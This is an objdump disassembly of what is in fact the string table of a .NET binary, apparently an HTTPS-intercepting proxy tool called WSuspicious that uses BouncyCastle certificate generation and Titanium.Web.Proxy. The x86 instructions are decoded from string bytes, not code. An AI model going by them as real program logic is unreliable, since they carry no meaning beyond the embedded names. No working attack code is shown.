  40746c:	73 6b                	jae    0x4074d9
  40746e:	41                   	inc    %ecx
  40746f:	77 61                	ja     0x4074d2
  407471:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  407478:	74 
  407479:	41                   	inc    %ecx
  40747a:	77 61                	ja     0x4074dd
  40747c:	69 74 65 72 00 48 74 	imul   $0x74744800,0x72(%ebp,%eiz,2),%esi
  407483:	74 
  407484:	70 53                	jo     0x4074d9
  407486:	65 72 76             	gs jb  0x4074ff
  407489:	65 72 00             	gs jb  0x40748c
  40748c:	50                   	push   %eax
  40748d:	72 6f                	jb     0x4074fe
  40748f:	78 79                	js     0x40750a
  407491:	53                   	push   %ebx
  407492:	65 72 76             	gs jb  0x40750b
  407495:	65 72 00             	gs jb  0x407498
  407498:	70 72                	jo     0x40750c
  40749a:	6f                   	outsl  %ds:(%esi),(%dx)
  40749b:	78 79                	js     0x407516
  40749d:	53                   	push   %ebx
  40749e:	65 72 76             	gs jb  0x407517
  4074a1:	65 72 00             	gs jb  0x4074a4
  4074a4:	47                   	inc    %edi
  4074a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4074a7:	65 72 61             	gs jb  0x40750b
  4074aa:	74 65                	je     0x407511
  4074ac:	4b                   	dec    %ebx
  4074ad:	65 79 50             	gs jns 0x407500
  4074b0:	61                   	popa
  4074b1:	69 72 00 41 73 79 6d 	imul   $0x6d797341,0x0(%edx),%esi
  4074b8:	6d                   	insl   (%dx),%es:(%edi)
  4074b9:	65 74 72             	gs je  0x40752e
  4074bc:	69 63 43 69 70 68 65 	imul   $0x65687069,0x43(%ebx),%esp
  4074c3:	72 4b                	jb     0x407510
  4074c5:	65 79 50             	gs jns 0x407518
  4074c8:	61                   	popa
  4074c9:	69 72 00 67 65 74 5f 	imul   $0x5f746567,0x0(%edx),%esi
  4074d0:	46                   	inc    %esi
  4074d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4074d2:	72 65                	jb     0x407539
  4074d4:	67 72 6f             	addr16 jb 0x407546
  4074d7:	75 6e                	jne    0x407547
  4074d9:	64 43                	fs inc %ebx
  4074db:	6f                   	outsl  %ds:(%esi),(%dx)
  4074dc:	6c                   	insb   (%dx),%es:(%edi)
  4074dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4074de:	72 00                	jb     0x4074e0
  4074e0:	73 65                	jae    0x407547
  4074e2:	74 5f                	je     0x407543
  4074e4:	46                   	inc    %esi
  4074e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e6:	72 65                	jb     0x40754d
  4074e8:	67 72 6f             	addr16 jb 0x40755a
  4074eb:	75 6e                	jne    0x40755b
  4074ed:	64 43                	fs inc %ebx
  4074ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f0:	6c                   	insb   (%dx),%es:(%edi)
  4074f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f2:	72 00                	jb     0x4074f4
  4074f4:	43                   	inc    %ebx
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	73 6f                	jae    0x407568
  4074f9:	6c                   	insb   (%dx),%es:(%edi)
  4074fa:	65 43                	gs inc %ebx
  4074fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4074fd:	6c                   	insb   (%dx),%es:(%edi)
  4074fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4074ff:	72 00                	jb     0x407501
  407501:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  407504:	73 6f                	jae    0x407575
  407506:	6c                   	insb   (%dx),%es:(%edi)
  407507:	65 43                	gs inc %ebx
  407509:	6f                   	outsl  %ds:(%esi),(%dx)
  40750a:	6c                   	insb   (%dx),%es:(%edi)
  40750b:	6f                   	outsl  %ds:(%esi),(%dx)
  40750c:	72 00                	jb     0x40750e
  40750e:	47                   	inc    %edi
  40750f:	65 74 45             	gs je  0x407557
  407512:	6e                   	outsb  %ds:(%esi),(%dx)
  407513:	75 6d                	jne    0x407582
  407515:	65 72 61             	gs jb  0x407579
  407518:	74 6f                	je     0x407589
  40751a:	72 00                	jb     0x40751c
  40751c:	58                   	pop    %eax
  40751d:	35 30 39 56 33       	xor    $0x33563930,%eax
  407522:	43                   	inc    %ebx
  407523:	65 72 74             	gs jb  0x40759a
  407526:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40752d:	47                   	inc    %edi
  40752e:	65 6e                	outsb  %gs:(%esi),(%dx)
  407530:	65 72 61             	gs jb  0x407594
  407533:	74 6f                	je     0x4075a4
  407535:	72 00                	jb     0x407537
  407537:	49                   	dec    %ecx
  407538:	52                   	push   %edx
  407539:	61                   	popa
  40753a:	6e                   	outsb  %ds:(%esi),(%dx)
  40753b:	64 6f                	outsl  %fs:(%esi),(%dx)
  40753d:	6d                   	insl   (%dx),%es:(%edi)
  40753e:	47                   	inc    %edi
  40753f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407541:	65 72 61             	gs jb  0x4075a5
  407544:	74 6f                	je     0x4075b5
  407546:	72 00                	jb     0x407548
  407548:	43                   	inc    %ebx
  407549:	72 79                	jb     0x4075c4
  40754b:	70 74                	jo     0x4075c1
  40754d:	6f                   	outsl  %ds:(%esi),(%dx)
  40754e:	41                   	inc    %ecx
  40754f:	70 69                	jo     0x4075ba
  407551:	52                   	push   %edx
  407552:	61                   	popa
  407553:	6e                   	outsb  %ds:(%esi),(%dx)
  407554:	64 6f                	outsl  %fs:(%esi),(%dx)
  407556:	6d                   	insl   (%dx),%es:(%edi)
  407557:	47                   	inc    %edi
  407558:	65 6e                	outsb  %gs:(%esi),(%dx)
  40755a:	65 72 61             	gs jb  0x4075be
  40755d:	74 6f                	je     0x4075ce
  40755f:	72 00                	jb     0x407561
  407561:	52                   	push   %edx
  407562:	73 61                	jae    0x4075c5
  407564:	4b                   	dec    %ebx
  407565:	65 79 50             	gs jns 0x4075b8
  407568:	61                   	popa
  407569:	69 72 47 65 6e 65 72 	imul   $0x72656e65,0x47(%edx),%esi
  407570:	61                   	popa
  407571:	74 6f                	je     0x4075e2
  407573:	72 00                	jb     0x407575
  407575:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40757a:	00 2e                	add    %ch,(%esi)
  40757c:	63 63 74             	arpl   %esp,0x74(%ebx)
  40757f:	6f                   	outsl  %ds:(%esi),(%dx)
  407580:	72 00                	jb     0x407582
  407582:	49                   	dec    %ecx
  407583:	6e                   	outsb  %ds:(%esi),(%dx)
  407584:	74 50                	je     0x4075d6
  407586:	74 72                	je     0x4075fa
  407588:	00 53 79             	add    %dl,0x79(%ebx)
  40758b:	73 74                	jae    0x407601
  40758d:	65 6d                	gs insl (%dx),%es:(%edi)
  40758f:	2e 44                	cs inc %esp
  407591:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  407598:	69 63 73 00 4f 72 67 	imul   $0x67724f00,0x73(%ebx),%esp
  40759f:	2e 42                	cs inc %edx
  4075a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075a2:	75 6e                	jne    0x407612
  4075a4:	63 79 43             	arpl   %edi,0x43(%ecx)
  4075a7:	61                   	popa
  4075a8:	73 74                	jae    0x40761e
  4075aa:	6c                   	insb   (%dx),%es:(%edi)
  4075ab:	65 2e 41             	gs cs inc %ecx
  4075ae:	73 6e                	jae    0x40761e
  4075b0:	31 2e                	xor    %ebp,(%esi)
  4075b2:	50                   	push   %eax
  4075b3:	6b 63 73 00          	imul   $0x0,0x73(%ebx),%esp
  4075b7:	4f                   	dec    %edi
  4075b8:	72 67                	jb     0x407621
  4075ba:	2e 42                	cs inc %edx
  4075bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4075bd:	75 6e                	jne    0x40762d
  4075bf:	63 79 43             	arpl   %edi,0x43(%ecx)
  4075c2:	61                   	popa
  4075c3:	73 74                	jae    0x407639
  4075c5:	6c                   	insb   (%dx),%es:(%edi)
  4075c6:	65 2e 50             	gs cs push %eax
  4075c9:	6b 63 73 00          	imul   $0x0,0x73(%ebx),%esp
  4075cd:	53                   	push   %ebx
  4075ce:	79 73                	jns    0x407643
  4075d0:	74 65                	je     0x407637
  4075d2:	6d                   	insl   (%dx),%es:(%edi)
  4075d3:	2e 52                	cs push %edx
  4075d5:	75 6e                	jne    0x407645
  4075d7:	74 69                	je     0x407642
  4075d9:	6d                   	insl   (%dx),%es:(%edi)
  4075da:	65 2e 43             	gs cs inc %ebx
  4075dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4075de:	6d                   	insl   (%dx),%es:(%edi)
  4075df:	70 69                	jo     0x40764a
  4075e1:	6c                   	insb   (%dx),%es:(%edi)
  4075e2:	65 72 53             	gs jb  0x407638
  4075e5:	65 72 76             	gs jb  0x40765e
  4075e8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4075ef:	62 75 67             	bound  %esi,0x67(%ebp)
  4075f2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4075f9:	65 
  4075fa:	73 00                	jae    0x4075fc
  4075fc:	4f                   	dec    %edi
  4075fd:	72 67                	jb     0x407666
  4075ff:	2e 42                	cs inc %edx
  407601:	6f                   	outsl  %ds:(%esi),(%dx)
  407602:	75 6e                	jne    0x407672
  407604:	63 79 43             	arpl   %edi,0x43(%ecx)
  407607:	61                   	popa
  407608:	73 74                	jae    0x40767e
  40760a:	6c                   	insb   (%dx),%es:(%edi)
  40760b:	65 2e 55             	gs cs push %ebp
  40760e:	74 69                	je     0x407679
  407610:	6c                   	insb   (%dx),%es:(%edi)
  407611:	69 74 69 65 73 00 53 	imul   $0x79530073,0x65(%ecx,%ebp,2),%esi
  407618:	79 
  407619:	73 74                	jae    0x40768f
  40761b:	65 6d                	gs insl (%dx),%es:(%edi)
  40761d:	2e 53                	cs push %ebx
  40761f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407623:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40762a:	70 
  40762b:	74 6f                	je     0x40769c
  40762d:	67 72 61             	addr16 jb 0x407691
  407630:	70 68                	jo     0x40769a
  407632:	79 2e                	jns    0x407662
  407634:	58                   	pop    %eax
  407635:	35 30 39 43 65       	xor    $0x65433930,%eax
  40763a:	72 74                	jb     0x4076b0
  40763c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407643:	73 00                	jae    0x407645
  407645:	53                   	push   %ebx
  407646:	74 61                	je     0x4076a9
  407648:	72 74                	jb     0x4076be
  40764a:	55                   	push   %ebp
  40764b:	70 64                	jo     0x4076b1
  40764d:	61                   	popa
  40764e:	74 65                	je     0x4076b5
  407650:	73 00                	jae    0x407652
  407652:	52                   	push   %edx
  407653:	65 61                	gs popa
  407655:	64 41                	fs inc %ecx
  407657:	6c                   	insb   (%dx),%es:(%edi)
  407658:	6c                   	insb   (%dx),%es:(%edi)
  407659:	42                   	inc    %edx
  40765a:	79 74                	jns    0x4076d0
  40765c:	65 73 00             	gs jae 0x40765f
  40765f:	67 65 74 5f          	addr16 gs je 0x4076c2
  407663:	50                   	push   %eax
  407664:	72 65                	jb     0x4076cb
  407666:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  40766c:	58                   	pop    %eax
  40766d:	35 30 39 4b 65       	xor    $0x654b3930,%eax
  407672:	79 53                	jns    0x4076c7
  407674:	74 6f                	je     0x4076e5
  407676:	72 61                	jb     0x4076d9
  407678:	67 65 46             	addr16 gs inc %esi
  40767b:	6c                   	insb   (%dx),%es:(%edi)
  40767c:	61                   	popa
  40767d:	67 73 00             	addr16 jae 0x407680
  407680:	4e                   	dec    %esi
  407681:	75 6c                	jne    0x4076ef
  407683:	6c                   	insb   (%dx),%es:(%edi)
  407684:	61                   	popa
  407685:	62 6c 65 46          	bound  %ebp,0x46(%ebp,%eiz,2)
  407689:	6c                   	insb   (%dx),%es:(%edi)
  40768a:	61                   	popa
  40768b:	67 73 00             	addr16 jae 0x40768e
  40768e:	4f                   	dec    %edi
  40768f:	70 65                	jo     0x4076f6
  407691:	6e                   	outsb  %ds:(%esi),(%dx)
  407692:	46                   	inc    %esi
  407693:	6c                   	insb   (%dx),%es:(%edi)
  407694:	61                   	popa
  407695:	67 73 00             	addr16 jae 0x407698
  407698:	54                   	push   %esp
  407699:	75 6e                	jne    0x407709
  40769b:	6e                   	outsb  %ds:(%esi),(%dx)
  40769c:	65 6c                	gs insb (%dx),%es:(%edi)
  40769e:	43                   	inc    %ebx
  40769f:	6f                   	outsl  %ds:(%esi),(%dx)
  4076a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4076a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4076a2:	65 63 74 53 65       	arpl   %esi,%gs:0x65(%ebx,%edx,2)
  4076a7:	73 73                	jae    0x40771c
  4076a9:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4076b0:	74 41                	je     0x4076f3
  4076b2:	72 67                	jb     0x40771b
  4076b4:	73 00                	jae    0x4076b6
  4076b6:	61                   	popa
  4076b7:	72 67                	jb     0x407720
  4076b9:	73 00                	jae    0x4076bb
  4076bb:	3c 3e                	cmp    $0x3e,%al
  4076bd:	34 5f                	xor    $0x5f,%al
  4076bf:	5f                   	pop    %edi
  4076c0:	74 68                	je     0x40772a
  4076c2:	69 73 00 4d 69 63 72 	imul   $0x7263694d,0x0(%ebx),%esi
  4076c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ca:	73 6f                	jae    0x40773b
  4076cc:	66 74 2e             	data16 je 0x4076fd
  4076cf:	43                   	inc    %ebx
  4076d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4076d1:	64 65 41             	fs gs inc %ecx
  4076d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d5:	61                   	popa
  4076d6:	6c                   	insb   (%dx),%es:(%edi)
  4076d7:	79 73                	jns    0x40774c
  4076d9:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  4076e0:	65 6d                	gs insl (%dx),%es:(%edi)
  4076e2:	2e 54                	cs push %esp
  4076e4:	68 72 65 61 64       	push   $0x64616572
  4076e9:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  4076f0:	6b 73 00 45          	imul   $0x45,0x0(%ebx),%esi
  4076f4:	71 75                	jno    0x40776b
  4076f6:	61                   	popa
  4076f7:	6c                   	insb   (%dx),%es:(%edi)
  4076f8:	73 00                	jae    0x4076fa
  4076fa:	54                   	push   %esp
  4076fb:	69 74 61 6e 69 75 6d 	imul   $0x2e6d7569,0x6e(%ecx,%eiz,2),%esi
  407702:	2e 
  407703:	57                   	push   %edi
  407704:	65 62 2e             	bound  %ebp,%gs:(%esi)
  407707:	50                   	push   %eax
  407708:	72 6f                	jb     0x407779
  40770a:	78 79                	js     0x407785
  40770c:	2e 4d                	cs dec %ebp
  40770e:	6f                   	outsl  %ds:(%esi),(%dx)
  40770f:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407712:	73 00                	jae    0x407714
  407714:	57                   	push   %edi
  407715:	53                   	push   %ebx
  407716:	75 73                	jne    0x40778b
  407718:	70 69                	jo     0x407783
  40771a:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40771d:	75 73                	jne    0x407792
  40771f:	2e 53                	cs push %ebx
  407721:	65 72 76             	gs jb  0x40779a
  407724:	65 72 73             	gs jb  0x40779a
  407727:	2e 50                	cs push %eax
  407729:	72 6f                	jb     0x40779a
  40772b:	78 79                	js     0x4077a6
  40772d:	2e 74 6c             	je,pn  0x40779c
  407730:	73 00                	jae    0x407732
  407732:	43                   	inc    %ebx
  407733:	6f                   	outsl  %ds:(%esi),(%dx)
  407734:	6e                   	outsb  %ds:(%esi),(%dx)
  407735:	74 61                	je     0x407798
  407737:	69 6e 73 00 58 35 30 	imul   $0x30355800,0x73(%esi),%ebp
  40773e:	39 45 78             	cmp    %eax,0x78(%ebp)
  407741:	74 65                	je     0x4077a8
  407743:	6e                   	outsb  %ds:(%esi),(%dx)
  407744:	73 69                	jae    0x4077af
  407746:	6f                   	outsl  %ds:(%esi),(%dx)
  407747:	6e                   	outsb  %ds:(%esi),(%dx)
  407748:	73 00                	jae    0x40774a
  40774a:	53                   	push   %ebx
  40774b:	79 73                	jns    0x4077c0
  40774d:	74 65                	je     0x4077b4
  40774f:	6d                   	insl   (%dx),%es:(%edi)
  407750:	2e 54                	cs push %esp
  407752:	65 78 74             	gs js  0x4077c9
  407755:	2e 52                	cs push %edx
  407757:	65 67 75 6c          	gs addr16 jne 0x4077c7
  40775b:	61                   	popa
  40775c:	72 45                	jb     0x4077a3
  40775e:	78 70                	js     0x4077d0
  407760:	72 65                	jb     0x4077c7
  407762:	73 73                	jae    0x4077d7
  407764:	69 6f 6e 73 00 53 61 	imul   $0x61530073,0x6e(%edi),%ebp
  40776b:	76 65                	jbe    0x4077d2
  40776d:	4f                   	dec    %edi
  40776e:	70 74                	jo     0x4077e4
  407770:	69 6f 6e 73 00 54 69 	imul   $0x69540073,0x6e(%edi),%ebp
  407777:	74 61                	je     0x4077da
  407779:	6e                   	outsb  %ds:(%esi),(%dx)
  40777a:	69 75 6d 2e 57 65 62 	imul   $0x6265572e,0x6d(%ebp),%esi
  407781:	2e 50                	cs push %eax
  407783:	72 6f                	jb     0x4077f4
  407785:	78 79                	js     0x407800
  407787:	2e 45                	cs inc %ebp
  407789:	78 63                	js     0x4077ee
  40778b:	65 70 74             	gs jo  0x407802
  40778e:	69 6f 6e 73 00 67 65 	imul   $0x65670073,0x6e(%edi),%ebp
  407795:	74 5f                	je     0x4077f6
  407797:	48                   	dec    %eax
  407798:	65 61                	gs popa
  40779a:	64 65 72 73          	fs gs jb 0x407811
  40779e:	00 47 65             	add    %al,0x65(%edi)
  4077a1:	74 48                	je     0x4077eb
  4077a3:	65 61                	gs popa
  4077a5:	64 65 72 73          	fs gs jb 0x40781c
  4077a9:	00 42 69             	add    %al,0x69(%edx)
  4077ac:	67 49                	addr16 dec %ecx
  4077ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4077af:	74 65                	je     0x407816
  4077b1:	67 65 72 73          	addr16 gs jb 0x407828
  4077b5:	00 4f 72             	add    %cl,0x72(%edi)
  4077b8:	67 2e 42             	addr16 cs inc %edx
  4077bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4077bc:	75 6e                	jne    0x40782c
  4077be:	63 79 43             	arpl   %edi,0x43(%ecx)
  4077c1:	61                   	popa
  4077c2:	73 74                	jae    0x407838
  4077c4:	6c                   	insb   (%dx),%es:(%edi)
  4077c5:	65 2e 43             	gs cs inc %ebx
  4077c8:	72 79                	jb     0x407843
  4077ca:	70 74                	jo     0x407840
  4077cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4077cd:	2e 50                	cs push %eax
  4077cf:	61                   	popa
  4077d0:	72 61                	jb     0x407833
  4077d2:	6d                   	insl   (%dx),%es:(%edi)
  4077d3:	65 74 65             	gs je  0x40783b
  4077d6:	72 73                	jb     0x40784b
  4077d8:	00 4b 65             	add    %cl,0x65(%ebx)
  4077db:	79 47                	jns    0x407824
  4077dd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077df:	65 72 61             	gs jb  0x407843
  4077e2:	74 69                	je     0x40784d
  4077e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e6:	50                   	push   %eax
  4077e7:	61                   	popa
  4077e8:	72 61                	jb     0x40784b
  4077ea:	6d                   	insl   (%dx),%es:(%edi)
  4077eb:	65 74 65             	gs je  0x407853
  4077ee:	72 73                	jb     0x407863
  4077f0:	00 52 73             	add    %dl,0x73(%edx)
  4077f3:	61                   	popa
  4077f4:	50                   	push   %eax
  4077f5:	72 69                	jb     0x407860
  4077f7:	76 61                	jbe    0x40785a
  4077f9:	74 65                	je     0x407860
  4077fb:	43                   	inc    %ebx
  4077fc:	72 74                	jb     0x407872
  4077fe:	4b                   	dec    %ebx
  4077ff:	65 79 50             	gs jns 0x407852
  407802:	61                   	popa
  407803:	72 61                	jb     0x407866
  407805:	6d                   	insl   (%dx),%es:(%edi)
  407806:	65 74 65             	gs je  0x40786e
  407809:	72 73                	jb     0x40787e
  40780b:	00 57 53             	add    %dl,0x53(%edi)
  40780e:	75 73                	jne    0x407883
  407810:	70 69                	jo     0x40787b
  407812:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  407815:	75 73                	jne    0x40788a
  407817:	2e 53                	cs push %ebx
  407819:	65 72 76             	gs jb  0x407892
  40781c:	65 72 73             	gs jb  0x407892
  40781f:	00 4f 72             	add    %cl,0x72(%edi)
  407822:	67 2e 42             	addr16 cs inc %edx
  407825:	6f                   	outsl  %ds:(%esi),(%dx)
  407826:	75 6e                	jne    0x407896
  407828:	63 79 43             	arpl   %edi,0x43(%ecx)
  40782b:	61                   	popa
  40782c:	73 74                	jae    0x4078a2
  40782e:	6c                   	insb   (%dx),%es:(%edi)
  40782f:	65 2e 43             	gs cs inc %ebx
  407832:	72 79                	jb     0x4078ad
  407834:	70 74                	jo     0x4078aa
  407836:	6f                   	outsl  %ds:(%esi),(%dx)
  407837:	2e 47                	cs inc %edi
  407839:	65 6e                	outsb  %gs:(%esi),(%dx)
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	74 6f                	je     0x4078af
  407840:	72 73                	jb     0x4078b5
  407842:	00 4f 72             	add    %cl,0x72(%edi)
  407845:	67 2e 42             	addr16 cs inc %edx
  407848:	6f                   	outsl  %ds:(%esi),(%dx)
  407849:	75 6e                	jne    0x4078b9
  40784b:	63 79 43             	arpl   %edi,0x43(%ecx)
  40784e:	61                   	popa
  40784f:	73 74                	jae    0x4078c5
  407851:	6c                   	insb   (%dx),%es:(%edi)
  407852:	65 2e 43             	gs cs inc %ebx
  407855:	72 79                	jb     0x4078d0
  407857:	70 74                	jo     0x4078cd
  407859:	6f                   	outsl  %ds:(%esi),(%dx)
  40785a:	2e 4f                	cs dec %edi
  40785c:	70 65                	jo     0x4078c3
  40785e:	72 61                	jb     0x4078c1
  407860:	74 6f                	je     0x4078d1
  407862:	72 73                	jb     0x4078d7
  407864:	00 50 72             	add    %dl,0x72(%eax)
  407867:	6f                   	outsl  %ds:(%esi),(%dx)
  407868:	63 65 73             	arpl   %esp,0x73(%ebp)
  40786b:	73 00                	jae    0x40786d
  40786d:	49                   	dec    %ecx
  40786e:	50                   	push   %eax
  40786f:	41                   	inc    %ecx
  407870:	64 64 72 65          	fs fs jb 0x4078d9
  407874:	73 73                	jae    0x4078e9
  407876:	00 67 65             	add    %ah,0x65(%edi)
  407879:	74 5f                	je     0x4078da
  40787b:	41                   	inc    %ecx
  40787c:	64 64 72 65          	fs fs jb 0x4078e5
  407880:	73 73                	jae    0x4078f5
  407882:	00 67 65             	add    %ah,0x65(%edi)
  407885:	74 5f                	je     0x4078e6
  407887:	49                   	dec    %ecx
  407888:	70 41                	jo     0x4078cb
  40788a:	64 64 72 65          	fs fs jb 0x4078f3
  40788e:	73 73                	jae    0x407903
  407890:	00 41 74             	add    %al,0x74(%ecx)
  407893:	74 72                	je     0x407907
  407895:	69 62 75 74 65 54 61 	imul   $0x61546574,0x75(%edx),%esp
  40789c:	72 67                	jb     0x407905
  40789e:	65 74 73             	gs je  0x407914
  4078a1:	00 44 65 73          	add    %al,0x73(%ebp,%eiz,2)
  4078a5:	63 65 6e             	arpl   %esp,0x6e(%ebp)
  4078a8:	64 61                	fs popa
  4078aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ab:	74 73                	je     0x407920
  4078ad:	00 73 65             	add    %dh,0x65(%ebx)
  4078b0:	74 5f                	je     0x407911
  4078b2:	41                   	inc    %ecx
  4078b3:	72 67                	jb     0x40791c
  4078b5:	75 6d                	jne    0x407924
  4078b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4078b9:	74 73                	je     0x40792e
  4078bb:	00 54 69 74          	add    %dl,0x74(%ecx,%ebp,2)
  4078bf:	61                   	popa
  4078c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c1:	69 75 6d 2e 57 65 62 	imul   $0x6265572e,0x6d(%ebp),%esi
  4078c8:	2e 50                	cs push %eax
  4078ca:	72 6f                	jb     0x40793b
  4078cc:	78 79                	js     0x407947
  4078ce:	2e 45                	cs inc %ebp
  4078d0:	76 65                	jbe    0x407937
  4078d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d3:	74 41                	je     0x407916
  4078d5:	72 67                	jb     0x40793e
  4078d7:	75 6d                	jne    0x407946
  4078d9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4078db:	74 73                	je     0x407950
  4078dd:	00 42 61             	add    %al,0x61(%edx)
  4078e0:	73 69                	jae    0x40794b
  4078e2:	63 43 6f             	arpl   %eax,0x6f(%ebx)
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	73 74                	jae    0x40795c
  4078e8:	72 61                	jb     0x40794b
  4078ea:	69 6e 74 73 00 67 65 	imul   $0x65670073,0x74(%esi),%ebp
  4078f1:	74 5f                	je     0x407952
  4078f3:	50                   	push   %eax
  4078f4:	72 6f                	jb     0x407965
  4078f6:	78 79                	js     0x407971
  4078f8:	45                   	inc    %ebp
  4078f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078fa:	64 50                	fs push %eax
  4078fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fd:	69 6e 74 73 00 45 78 	imul   $0x78450073,0x74(%esi),%ebp
  407904:	69 73 74 73 00 67 65 	imul   $0x65670073,0x74(%ebx),%esi
  40790b:	74 5f                	je     0x40796c
  40790d:	4d                   	dec    %ebp
  40790e:	6f                   	outsl  %ds:(%esi),(%dx)
  40790f:	64 75 6c             	fs jne 0x40797e
  407912:	75 73                	jne    0x407987
  407914:	00 57 53             	add    %dl,0x53(%edi)
  407917:	75 73                	jne    0x40798c
  407919:	70 69                	jo     0x407984
  40791b:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40791e:	75 73                	jne    0x407993
  407920:	00 41 64             	add    %al,0x64(%ecx)
  407923:	64 44                	fs inc %esp
  407925:	61                   	popa
  407926:	79 73                	jns    0x40799b
  407928:	00 63 65             	add    %ah,0x65(%ebx)
  40792b:	72 74                	jb     0x4079a1
  40792d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407934:	56                   	push   %esi
  407935:	61                   	popa
  407936:	6c                   	insb   (%dx),%es:(%edi)
  407937:	69 64 44 61 79 73 00 	imul   $0x63007379,0x61(%esp,%eax,2),%esp
  40793e:	63 
  40793f:	65 72 74             	gs jb  0x4079b6
  407942:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407949:	47                   	inc    %edi
  40794a:	72 61                	jb     0x4079ad
  40794c:	63 65 44             	arpl   %esp,0x44(%ebp)
  40794f:	61                   	popa
  407950:	79 73                	jns    0x4079c5
  407952:	00 43 6f             	add    %al,0x6f(%ebx)
  407955:	6e                   	outsb  %ds:(%esi),(%dx)
  407956:	63 61 74             	arpl   %esp,0x74(%ecx)
  407959:	00 46 6f             	add    %al,0x6f(%esi)
  40795c:	72 6d                	jb     0x4079cb
  40795e:	61                   	popa
  40795f:	74 00                	je     0x407961
  407961:	41                   	inc    %ecx
  407962:	73 6e                	jae    0x4079d2
  407964:	31 4f 62             	xor    %ecx,0x62(%edi)
  407967:	6a 65                	push   $0x65
  407969:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  40796d:	79 73                	jns    0x4079e2
  40796f:	74 65                	je     0x4079d6
  407971:	6d                   	insl   (%dx),%es:(%edi)
  407972:	2e 4e                	cs dec %esi
  407974:	65 74 00             	gs je  0x407977
  407977:	73 65                	jae    0x4079de
  407979:	74 5f                	je     0x4079da
  40797b:	52                   	push   %edx
  40797c:	65 75 73             	gs jne 0x4079f2
  40797f:	65 53                	gs push %ebx
  407981:	6f                   	outsl  %ds:(%esi),(%dx)
  407982:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407985:	74 00                	je     0x407987
  407987:	68 49 6e 74 65       	push   $0x65746e49
  40798c:	72 6e                	jb     0x4079fc
  40798e:	65 74 00             	gs je  0x407991
  407991:	53                   	push   %ebx
  407992:	70 6c                	jo     0x407a00
  407994:	69 74 00 49 6e 69 74 	imul   $0x74696e,0x49(%eax,%eax,1),%esi
  40799b:	00 
  40799c:	57                   	push   %edi
  40799d:	61                   	popa
  40799e:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  4079a5:	69 
  4079a6:	74 00                	je     0x4079a8
  4079a8:	46                   	inc    %esi
  4079a9:	69 72 73 74 4f 72 44 	imul   $0x44724f74,0x73(%edx),%esi
  4079b0:	65 66 61             	gs popaw
  4079b3:	75 6c                	jne    0x407a21
  4079b5:	74 00                	je     0x4079b7
  4079b7:	47                   	inc    %edi
  4079b8:	65 74 52             	gs je  0x407a0d
  4079bb:	65 73 75             	gs jae 0x407a33
  4079be:	6c                   	insb   (%dx),%es:(%edi)
  4079bf:	74 00                	je     0x4079c1
  4079c1:	53                   	push   %ebx
  4079c2:	65 74 52             	gs je  0x407a17
  4079c5:	65 73 75             	gs jae 0x407a3d
  4079c8:	6c                   	insb   (%dx),%es:(%edi)
  4079c9:	74 00                	je     0x4079cb
  4079cb:	67 65 74 5f          	addr16 gs je 0x407a2e
  4079cf:	43                   	inc    %ebx
  4079d0:	6f                   	outsl  %ds:(%esi),(%dx)
